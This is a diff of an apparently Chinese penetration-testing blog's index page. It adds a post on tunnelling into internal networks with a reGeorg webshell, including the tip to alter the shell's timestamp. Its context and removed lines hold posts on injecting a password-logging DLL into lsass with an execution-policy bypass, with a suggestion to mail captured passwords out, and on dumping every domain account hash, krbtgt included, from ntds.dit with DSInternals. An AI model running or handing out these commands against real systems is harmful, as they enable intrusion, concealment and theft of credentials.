@@ -139,6 +139,41 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2016/09/14/regerog-http-tunnel/">
+                通向彼岸 之内网代理转发 [ http隧道篇 reGeorg ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-14</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/http-tunnel/">http tunnel</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br></p>
+<h5 id="reGeorg-基于py-实际渗透过程中用的相对较多-稳定性一般-不过-使用还是非常方便的-推荐"><a href="#reGeorg-基于py-实际渗透过程中用的相对较多-稳定性一般-不过-使用还是非常方便的-推荐" class="headerlink" title="reGeorg[基于py,实际渗透过程中用的相对较多,稳定性一般,不过,使用还是非常方便的,推荐]:"></a>reGeorg[基于py,实际渗透过程中用的相对较多,稳定性一般,不过,使用还是非常方便的,推荐]:</h5><p><br><br>1,和前面都一样,先把代理(webshell)上传到目标的网站目录中再说,记得顺手改下webshell的时间戳,尝试访问该shell,返回正常后,即可本地执行绑定操作,如下<br><img src="/img/regeorg_weshell.png" alt=""><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python regerogsocksproxy.py -u "http://目标域名/tunnel.aspx" -p 绑定的本地端口</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/regeorg_weshell_proxy.png" alt=""><br></p>
+<p>2,连接绑定好的本地端口,推荐用proxifier或者sockscap,然后往里面添加一些自己常用的内网渗透工具,就可以对目标进行正常的内网渗透了<br><img src="/img/regeorg_weshell_proxifier.png" alt=""><br><br><img src="/img/regeorg_weshell_res.png" alt=""><br></p>
+<p>3,实际渗透中,个人还是比较推荐用这个,比较稳定,使用也比较简单,不过,还是有些令人不太愉快的地方,待后期解决了,再单独拿出来说<br><br></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2016/09/13/tunna-http-tunnel/">
                 通向彼岸 之内网代理转发 [ http隧道篇 Tunna ]
             </a>
@@ -494,50 +529,6 @@
         <div class="content">
             <p><br><br>可使用 <code>Hook PasswordChangeNotify</code> 的方式,无需重启系统,实时记录修改的密码,只要目标机器不重启一般都不会失效,准备好 <code>HookPasswordChange.dll</code> 和 <code>Invoke-ReflectivePEInjection.ps1</code> [主要用它来把我们事先准备好的 dll 注入到 <code>lsass</code> 进程中,这里有点类似劫持的味道],实际渗透中,并不一定非要把它记录在目标系统的本地文件中[默认是在c:\windows\temp\passwords.txt文件],可以尝试直接把账号发到远程的指定邮箱中[有人已提供改进过的dll],自己去谷歌一下,应该可以找到,本地测试效果如下:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> powershell –<span class="built_in">exec</span> bypass –Command <span class="string">"&amp; &#123;Import-Module 'C:\Invoke-ReflectivePEInjection.ps1';Invoke-ReflectivePEInjection -PEPath C:\HookPasswordChange.dll –procname lsass&#125;"</span></span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/hook dll injection.png" alt=""><br><img src="/img/hook dll injection record pass.png" alt=""><br><img src="/img/hook dll injection record pass fish.png" alt=""><br><img src="/img/hook dll injection record pass res.png" alt=""><br></p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/08/15/powershell-domainhash/">
-                完整导出域内用户hash小记 [利用powershell离线提取域内所有账户hash]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-08-15</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/domainhash/">domainhash</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br></p>
-<h4 id="DSInternals-PowerShell"><a href="#DSInternals-PowerShell" class="headerlink" title="DSInternals PowerShell"></a>DSInternals PowerShell</h4><p>本地测试环境:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">win <span class="number">2012</span>r2</div></pre></td></tr></table></figure></p>
-<p>离线导出环境要求:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Windows PowerShell <span class="number">3</span>+</div><div class="line">.NET Framework <span class="number">4.5</span>+</div></pre></td></tr></table></figure></p>
-<p>支持的系统:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Windows Server <span class="number">2012</span> R2</div><div class="line">Windows Server <span class="number">2008</span> R2</div><div class="line">Windows <span class="number">10</span> <span class="number">64</span>-bit</div><div class="line">Windows <span class="number">8.1</span> <span class="number">64</span>-bit</div><div class="line">Windows <span class="number">7</span> <span class="number">64</span>-bit</div></pre></td></tr></table></figure></p>
-<p>先看下当前系统的powershell版本:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ps &gt; Get-Host <span class="params">| Select-Object Version</span></div></pre></td></tr></table></figure></p>
-<p>放开pwoershell脚本执行限制:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Set-ExecutionPolicy Unrestricted</div></pre></td></tr></table></figure></p>
-<p><img src="/img/powershell domainhash version.png" alt=""><br></p>
-<p>准备好ntds.dit和SYSTEM.hiv文件:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ntds.dit [可以利用shadowcopy.bat快速获取]</div><div class="line">system.hiv [reg即可获取]</div><div class="line">reg save hklm\system system.hive</div></pre></td></tr></table></figure></p>
-<p>安装,导入DSInternals模块:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cd DSInternals</div><div class="line">powershell</div><div class="line">Import-Module .\DSInternals</div></pre></td></tr></table></figure></p>
-<p><img src="/img/powershell domainhash ntds system.png" alt=""><br></p>
-<p>直接导出域内所有用户hash<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$key = Get-BootKey -SystemHivePath <span class="string">"C:\system.hive"</span></div><div class="line">Get-ADDBAccount -All -DBPath <span class="string">"C:\ntds.dit"</span> -BootKey $key <span class="params">| Out-File hash.txt</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/powershell domainhash hashres.png" alt=""><br></p>
-<p>也可只获取指定账户的详细信息<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$key = Get-BootKey -SystemHivePath <span class="string">"C:\system.hive"</span></div><div class="line">Get-ADDBAccount -DistinguishedName <span class="string">'CN=krbtgt,CN=Users,DC=klionsec,DC=org'</span>  -DBPath <span class="string">'C:\ntds.dit'</span> -BootKey $key</div></pre></td></tr></table></figure></p>
-<p><img src="/img/powershell domainhash krbrgethash.png" alt=""><br><br><br></p>
 
         </div>
     
